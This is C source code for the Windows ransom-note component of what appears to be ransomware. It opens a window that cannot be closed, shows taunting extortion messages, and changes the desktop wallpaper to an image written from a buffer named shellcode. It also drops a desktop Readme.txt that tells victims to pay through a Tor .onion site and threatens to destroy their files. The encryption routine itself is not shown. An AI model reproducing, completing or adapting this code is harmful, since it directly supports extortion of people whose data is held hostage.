BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize) {
	if (!pathBuffer || bufferSize == 0) {
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}

	wchar_t userProfilePath[MAX_PATH];
	DWORD result = ExpandEnvironmentStringsW(L"%USERPROFILE%", userProfilePath, MAX_PATH);

	if (result == 0 || result > MAX_PATH) {
		wchar_t username[UNLEN + 1];
		DWORD username_len = UNLEN + 1;

		if (!GetUserNameW(username, &username_len)) {
			wcscpy_s(pathBuffer, bufferSize, L"C:\\Users\\Default\\Pictures\\image1.bmp");
			return TRUE;
		}

		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
			L"C:\\Users\\%s\\Pictures\\image1.bmp", username))) {
			SetLastError(ERROR_INSUFFICIENT_BUFFER);
			return FALSE;
		}
	}
	else {
		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
			L"%s\\Pictures\\image1.bmp", userProfilePath))) {
			SetLastError(ERROR_INSUFFICIENT_BUFFER);
			return FALSE;
		}
	}

	return TRUE;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {


	switch (uMsg) {
	case WM_SYSCOMMAND:
		if ((wParam & 0xFFF0) == SC_CLOSE) {
			return 0;
		}
		break;

	case WM_CLOSE:
		return 0;



	case WM_PAINT: {
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hwnd, &ps);
		FillRect(hdc, &ps.rcPaint, (HBRUSH)GetStockObject(BLACK_BRUSH));
		SetTextColor(hdc, RGB(139, 0, 0));
		SetBkMode(hdc, RGB(0, 0, 0)); 
		LPCWSTR text = L"WELL, WELL, WELL... LOOK WHO GOT CAUGHT!  >.< Oopsie! ";
		LPCWSTR text1 = L"Your precious system? Not yours anymore  :'( ";
		LPCWSTR text2 = L"Your data? Still there.. but let’s just say it’s on a little vacation. And nope, you’re not invited";
		LPCWSTR text3 = L"WE’RE SOOOO SORRY...";
		LPCWSTR text4 = L"(Just kidding we’re not.)";
		LPCWSTR text5 = L"Wanna beg for your files back?";
		LPCWSTR text6 = L"No worries, we made it super easy for you:";
		LPCWSTR text7 = L"Go ahead, check that cute little README on your desktop.";

		RECT textRect;
		GetClientRect(hwnd, &textRect);

		int spaceBetweenText = 35;
		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text1, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text2, -1, &textRect, DT_SINGLELINE | DT_CENTER);
		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text3, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text4, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text5, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text6, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		textRect.top += spaceBetweenText;
		textRect.bottom += spaceBetweenText;

		DrawText(hdc, text7, -1, &textRect, DT_SINGLELINE | DT_CENTER);

		EndPaint(hwnd, &ps);  


	}
	case WM_CTLCOLORBTN: {
		HDC hdcBtn = (HDC)wParam;
		SetTextColor(hdcBtn, RGB(139, 0, 0));
		SetBkColor(hdcBtn, RGB(20, 20, 20));

		static HBRUSH hBrush = NULL;
		if (!hBrush) {
			hBrush = CreateSolidBrush(RGB(20, 20, 20));
		}

		return (INT_PTR)hBrush;
	}

	case WM_CREATE: {

		RECT rect;
		GetClientRect(hwnd, &rect);

		int buttonWidth = 300;
		int buttonHeight = 50;

		int x = (rect.right - buttonWidth) / 2;
		int y = (rect.bottom - buttonHeight) / 1.1;

		HWND hButton = CreateWindowW(
			L"BUTTON",
			L"PRESS ME",
			WS_VISIBLE | WS_CHILD,
			x, y, buttonWidth, buttonHeight,
			hwnd, (HMENU)2, NULL, NULL
		);

		break;
	}
	case WM_COMMAND:
		if (LOWORD(wParam) == 2) {

			MessageBoxW(
				hwnd,
				L"MORE FILES HAVE BEEN ENCRYPTED, ARE YOU IDIOT OR SOMETHING LIKE THAT ?",
				L"HAHAHA!",
				MB_ICONHAND | MB_OK
			);
		}
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	default: {

		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}

	}
	return 0;
}

VOID WriteWarningToDesktop() {
	char desktopPath[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
		strcat(desktopPath, "\\Readme.txt");

		HANDLE hFile = CreateFileA(
			desktopPath,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);



		const char* message =
			"OH NO! Looks like someone’s having a bad day...\n"
			"\n"
			"Your files? Locked.\n"
			"Your system? Ours now.\n"
			"Your control? Long gone.\n"
			"\n"
			"But hey, don’t cry just yet—we’re feeling generous today.\n"
			"\n"
			"Want your precious data back?\n"
			"Here’s how to maybe earn our mercy:\n"
			"\n"
			"1. Download the Tor Browser – yeah, regular browsers won’t help you now.\n"
			"\n"
			"2. Open it. Take a deep breath.\n"
			"\n"
			"3. Go to our special website (you’ll love it):\n"
			"aav3lis2vqulgmot2dulx7seyqv3vyv4i5r3gp5k7bi2t7ll6dsofxyd.onion\n"
			"\n"
			"Once you're there, follow the instructions. Yes, it involves money. No, we don’t do refunds.\n"
			"Try anything funny, and your files take a one-way trip to the digital abyss.\n"
			"\n"
			"Time’s ticking.\n"
			"Every second you wait, your chances get slimmer.\n"
			"Tick tock\n";
		DWORD bytesWritten;
		WriteFile(hFile, message, strlen(message), &bytesWritten, NULL);

		CloseHandle(hFile);

	}

}

BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shellcode, DWORD shellcodeSize, WNDPROC windowProc) {
	if (!hInstance || !windowProc || !shellcode || shellcodeSize == 0) {
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}

	char usernameA[256] = { 0 };
	DWORD usernameASize = sizeof(usernameA);
	if (!GetUserNameA(usernameA, &usernameASize)) {
		return FALSE;
	}

	char filePath[MAX_PATH] = { 0 };
	if (FAILED(StringCchPrintfA(filePath, MAX_PATH, "C:\\Users\\%s\\Pictures\\image2.bmp", usernameA))) {
		return FALSE;
	}

	if (!WriteShellcodeToFile(shellcode, shellcodeSize, filePath)) {
		return FALSE;
	}

	WCHAR usernameW[256] = { 0 };
	DWORD usernameWSize = ARRAYSIZE(usernameW);
	if (!GetUserNameW(usernameW, &usernameWSize)) {
		return FALSE;
	}

	WCHAR wallpaperPath[MAX_PATH] = { 0 };
	if (FAILED(StringCchPrintfW(wallpaperPath, MAX_PATH, L"C:\\Users\\%s\\Pictures\\image2.bmp", usernameW))) {
		return FALSE;
	}

	if (!SetWallpaper(wallpaperPath)) {
	}

	const wchar_t CLASS_NAME[] = L"PhantomWindow";
	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = windowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);

	if (!RegisterClass(&wc)) {
		return FALSE;
	}

	HWND hwnd = CreateWindowEx(
		0,
		CLASS_NAME,
		L"",
		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
		CW_USEDEFAULT, CW_USEDEFAULT,
		700, 440,
		NULL, NULL, hInstance, NULL
	);

	if (!hwnd) {
		return FALSE;
	}

	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);

	return TRUE;
}
